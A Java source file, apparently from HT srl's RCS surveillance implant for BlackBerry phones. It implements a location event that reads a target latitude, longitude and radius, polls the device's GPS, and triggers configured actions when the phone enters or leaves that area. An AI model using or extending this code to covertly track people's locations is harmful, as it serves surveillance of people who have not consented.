//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : LocationEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import javax.microedition.location.Coordinates;
import javax.microedition.location.Location;
import javax.microedition.location.LocationProvider;
import javax.microedition.location.QualifiedCoordinates;

import blackberry.config.ConfEvent;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.location.LocationHelper;
import blackberry.location.LocationObserver;

/**
 * The Class LocationEvent.
 */
public final class EventLocation extends Event implements LocationObserver {
    private static final long LOCATION_PERIOD = 60000;
    private static final long LOCATION_DELAY = 1000;
    //#ifdef DEBUG
    private static Debug debug = new Debug("LocationEvent", DebugLevel.VERBOSE);
    //#endif

    int actionOnEnter;
    int actionOnExit;

    int distance;
    double latitudeOrig;
    double longitudeOrig;
    Coordinates coordinatesOrig;

    LocationProvider lp;
    boolean entered = false;

    //int interval = 60;

    public boolean parse(ConfEvent conf) {
        try {
            distance = conf.getInt("distance");

            latitudeOrig = (float) conf.getDouble("latitude");
            longitudeOrig = (float) conf.getDouble("longitude");

            //#ifdef DEBUG
            debug.trace(" Lat: " + latitudeOrig + " Lon: " + longitudeOrig + " Dist: " + distance);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
            //#endif
        } catch (final ConfigurationException ex) {
            return false;
        }

        return true;
    }

    protected void actualStart() {

        //#ifdef DEBUG
        debug.trace("setLocationListener");
        //#endif
        //lp.setLocationListener(this, interval, Conf.GPS_TIMEOUT, Conf.GPS_MAXAGE);

        entered = false;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualGo() {
        //#ifdef DEBUG
        debug.trace("actualRun");
        //#endif
        if (lp == null) {
            //#ifdef DEBUG
            debug.error("GPS Not Supported on Device");
            //#endif               
            return;
        }

        if (waitingForPoint) {
            //#ifdef DEBUG
            debug.trace("waitingForPoint");
            //#endif
            return;
        }

        synchronized (this) {
            LocationHelper.getInstance().start(this, false);
        }

        //#ifdef DEBUG
        debug.trace("exiting actualRun");
        //#endif
    }

    protected void actualStop() {
        if (lp != null) {
            //#ifdef DEBUG
            debug.trace("actualStop: resetting");
            //#endif
            //lp.setLocationListener(null, -1, -1, -1 );
            lp.reset();
        }

        onExit();
    }

    boolean waitingForPoint = false;

    public void newLocation(Location loc) {
        //#ifdef DEBUG
        debug.trace("checkProximity: " + loc);
        //#endif

        QualifiedCoordinates coord = null;
        try {
            coord = loc.getQualifiedCoordinates();
            coordinatesOrig = new Coordinates(latitudeOrig, longitudeOrig,
                    coord.getAltitude());

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("QualifiedCoordinates: " + ex);
            //#endif
            return;

        }

        try {
            final double actualDistance = coord.distance(coordinatesOrig);
            //#ifdef DEBUG
            debug.info("Distance: " + actualDistance);
            //#endif
            if (actualDistance < distance) {
                if (!entered) {
                    //#ifdef DEBUG
                    debug.info("Enter");
                    //#endif
                    onEnter();
                    entered = true;
                } else {
                    //#ifdef DEBUG
                    debug.trace("Already entered");
                    //#endif
                }
            } else {
                if (entered) {
                    //#ifdef DEBUG
                    debug.info("Exit");
                    //#endif
                    onExit();
                    entered = false;
                } else {
                    //#ifdef DEBUG
                    debug.trace("Already exited");
                    //#endif
                }
            }
        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("Distance: " + ex);
            //#endif
            return;
        }
    }

    public synchronized void waitingForPoint(boolean b) {
        waitingForPoint = b;
    }

    public void errorLocation() {
        //#ifdef DEBUG
        debug.error("errorLocation");
        //#endif
    }

}
